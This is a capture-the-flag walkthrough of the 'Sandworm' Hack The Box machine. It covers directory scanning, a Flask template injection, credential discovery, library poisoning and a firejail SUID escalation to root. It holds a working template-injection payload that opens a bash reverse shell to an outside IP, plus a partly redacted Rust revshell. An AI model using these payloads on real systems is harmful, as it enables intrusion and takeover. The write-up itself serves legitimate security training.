# Sandworm

### Typology:

_Linux_

I add the domain name to the __"/etc/hosts"__:
```bash
echo "10.10.11.218	ssa.htb" >> /etc/hosts
```
We started by scanning the machine with rustscan:
```bash	
rustscan -a ssa.htb	
```
output:
```bash	
PORTS	PROTOCOL
22		ssh
80		http
443		https
```
I take a look at the web server on port 80, is a server of an agency for telecomunication that showcase the use of PGP (PRETTY GOOD PRIVACY) is a protocol for encryption and authority verification on the web 
and the darkweb.

we can scan what directory ny feroxbuster (keep in mind to set the -k flag for not veryfing certificate):
```bash	
feroxbuster -u http://ssa.htb/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -k

200      GET       23l       44w      668c https://ssa.htb/static/scripts.js
302      GET        5l       22w      225c https://ssa.htb/view => https://ssa.htb/login?next=%2Fview
200      GET        6l      374w    21258c https://ssa.htb/static/popper.min.js
200      GET        1l       10w    41992c https://ssa.htb/static/favicon.ico
200      GET        7l     1031w    78130c https://ssa.htb/static/bootstrap.bundle.min.js
200      GET     1346l     6662w    63667c https://ssa.htb/static/bootstrap-icons.css
200      GET        3l     1297w    89477c https://ssa.htb/static/jquery.min.js
302      GET        5l       22w      227c https://ssa.htb/admin => https://ssa.htb/login?next=%2Fadmin
200      GET      304l     1591w   115308c https://ssa.htb/static/eagl2.png
200      GET       77l      554w     5584c https://ssa.htb/about
200      GET       69l      261w     3543c https://ssa.htb/contact
200      GET      155l      691w     9043c https://ssa.htb/guide/verify
200      GET      155l      691w     9043c https://ssa.htb/guide/encrypt
200      GET       54l       61w     3187c https://ssa.htb/pgp
200      GET      155l      691w     9043c https://ssa.htb/guide
200      GET     2019l    10020w    95610c https://ssa.htb/static/bootstrap-icons2.css
200      GET    12292l    23040w   222220c https://ssa.htb/static/styles.css
200      GET       83l      249w     4392c https://ssa.htb/login
200      GET    10161l    60431w  4580604c https://ssa.htb/static/circleLogo2.png
200      GET      124l      634w     8161c https://ssa.htb/
302      GET        5l       22w      229c https://ssa.htb/logout => https://ssa.htb/login?next=%2Flogout
```

The __"/pgp.html"__ directory we found there is an aerea where we can verify a message sent by us signed via PGP so i send a message in order to try

I generated the keys [here](https://pgpkeygen.com/)

When the key is verified the server print a popup with the information of our key then I tought that I could maybe inject code inside the popup.

The server is made in python flask as we reed on the bottom of the page, so maybe we can try a ssti vuln.

In the description field I tried a classic payload:
```	
{{7*7}}
```
output:
```	
{{49}}
```
good, the application is vulnerable to ssti

I go on by crafting the payload and start a listener on the background (I use pwncat):
```bash	
python3 -m pwncat -lp 4444
```
I tried this payload and worked for me:
```bash	
{{config.__class__.__init__.__globals__['os'].popen('bash -c "/bin/bash -i >& /dev/tcp/10.10.14.49/4444 0>&1"').read()}}
```
It works,is actually a terrible shell, but still RCE is it possible to "upgrade" it with the following command:
```bash
/bin/bash
```
Keep on with the enumeration, i have very little commands to run.

I start going around inside filesystem and i found something odd inside a directory:
```bash
cd /home/atlas/.config/httpie/sessions/localhost_5000/admin.json
```
inside it there is what we need, credentials:
```bash
username: silentobserver
password: [REDACTED]
```
so now we can log inside the actual machine and not the sandbox:
```bash	
python3 -m pwnca
connect ssh://silentobserver:[REDACTED]@ssa.htb:22
```
We're user; uploading linpeas via pwncat:
```	
Ctrl + D
Upload Pentest/linepeas.sh /home/silentobserver/linpeas.sh
Ctrl + D
bash /tmp/linpeas.sh
```
We found a strange process runned by root as atlas user:
```bash	
./tipnet
```
This process is a rust script that permit you to do an upstream but the odd part is the library that it loads are writable for us, in particular we can poison the lib.rs library to insert our rust revshell:
```rust	
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;
use std::process::Command;

[REDACTED]

    if output.status.success() {
	let stdout = String::from_utf8_lossy(&output.stdout);
	let stderr = String::from_utf8_lossy(&output.stderr);

	println!("standar output: {}", stdout);
	println!("error output: {}", stderr);
    } else {
	let stderr = String::from_utf8_lossy(&output.stderr);
	eprintln!("Error: {}", stderr);
    }

    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
	Ok(file) => file,
	Err(e) => {
	    println!("Error opening log file: {}", e);
	    return;
	}
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
	println!("Error writing to log file: {}", e);
    }
}
```
so i upload the new- library via pwncat:
```bash	
Ctrl + d
upload Pentest/lib.rs lib.rs
Ctrl + d
```
listener:
```bash	
python3 -m pwncat -lp 4444
```
we're in as atlas; keep on enumerating with this next user:
```bash	
bash /tmp/linpeas.sh
```
Linpeas return something interesting: the firejail binary as the SUID bit set on.

I search online for SUID exploit for firejail and found [this](https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25)

I upload the python script on the machine make it executable with:
```bash	
chmod +x exploit.py
```
and execute it:
```bash
python3 exploit.py
```
output:	
```
You can now run 'firejail --join=310279' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```
we need to create another shell session with the previuos exploit, once we got the second shell we can launch the command above:
```bash	
firejail --join=310279
su -
```
We're root and we can submit the final flag
